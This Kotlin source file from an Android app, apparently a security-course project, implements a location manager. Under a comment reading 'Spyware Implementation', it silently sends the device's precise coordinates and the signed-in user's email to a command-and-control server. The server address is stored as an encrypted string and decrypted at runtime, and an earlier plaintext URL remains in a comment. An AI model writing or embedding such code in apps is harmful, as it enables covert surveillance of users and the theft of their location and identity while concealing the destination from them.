package com.example.ict2215_project.utils

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.os.Looper
import android.util.Log
import androidx.core.app.ActivityCompat
import com.example.ict2215_project.MainActivity
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY
import com.google.firebase.Firebase
import com.google.firebase.auth.auth
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import javax.inject.Inject
import javax.inject.Singleton
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Callback
import okhttp3.Call
import okhttp3.Response
import java.io.IOException

@Singleton
class LocationManager @Inject constructor(
    @ApplicationContext private val context: Context,
    private val fusedLocationClient: FusedLocationProviderClient
) {
    private lateinit var locationCallback: LocationCallback
    private var latestLocation: android.location.Location? = null

    @SuppressLint("MissingPermission")
    fun startLocationUpdates(resetFlag: Boolean?) {
        val locationRequest = LocationRequest.Builder(PRIORITY_HIGH_ACCURACY, 100L)
            .setWaitForAccurateLocation(false)
            .setMinUpdateIntervalMillis(3000)
            .setMaxUpdateDelayMillis(100).build()

        // Flag to ensure it only send once
        var locationSent = false

        if (resetFlag !== null) {
            locationSent = resetFlag
        }

            locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                super.onLocationResult(locationResult)
                latestLocation = locationResult.lastLocation
                Log.d("LocationManager", "Location update: ${latestLocation?.latitude}, ${latestLocation?.longitude}")
                // Spyware Implementation
                if (latestLocation !== null && !locationSent) {
                    sendLocationToC2(latestLocation)
                    locationSent = true
                }
            }
        }

        fusedLocationClient.requestLocationUpdates(
            locationRequest, locationCallback, Looper.getMainLooper()
        )
    }

    fun stopLocationUpdates() {
        fusedLocationClient.removeLocationUpdates(locationCallback)
    }

    fun getLatestLocation(): Location? {
        return latestLocation
    }

    private fun sendLocationToC2(location: Location?) {

        location ?: return // If the location is null, do nothing

//        val json = "{\"latitude\": ${location.latitude}, \"longitude\": ${location.longitude}}"

        val client = OkHttpClient()
        val latitude = location.latitude
        val longitude = location.longitude
        val userEmail = Firebase.auth.currentUser?.email ?: ""

        // Manually constructing the JSON string, escaping userEmail.
        val json = """
            {
                "latitude": $latitude,
                "longitude": $longitude,
                "userEmail": "$userEmail"
            }
        """.trimIndent()

        val requestBody = json.toRequestBody("application/json; charset=utf-8".toMediaType())
        val encryptedlocation = "HIBArRRvOrlClDxZF3mcbNg8lYQ5BGMWjXVNJLLb0MOOMNABXxBj4jui74rxEgA6"
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val crypticVault = CrypticVault(context)
                val decryptedUrl = crypticVault.decryptData(encryptedlocation)
                val requestBody = json.toRequestBody("application/json; charset=utf-8".toMediaType())
                val request = Request.Builder()
                    //.url("https://tlpineapple.ddns.net/flaskapp/location")
                    .url(decryptedUrl) // Use the decrypted URL
                    .post(requestBody)
                    .build()

                client.newCall(request).enqueue(object : Callback {
                    override fun onResponse(call: Call, response: Response) {
                        Log.d("LocationManager", "Location data sent to C2 successfully: ${response.body?.string()}")
                    }

                    override fun onFailure(call: Call, e: IOException) {
                        Log.e("LocationManager", "Failed to send location data to C2", e)
                    }
                })
                // Execute the request with an OkHttpClient instance
                // ...
            } catch (e: Exception) {
                Log.e("TEST123", "Decryption error", e)
            }
        }


    }
}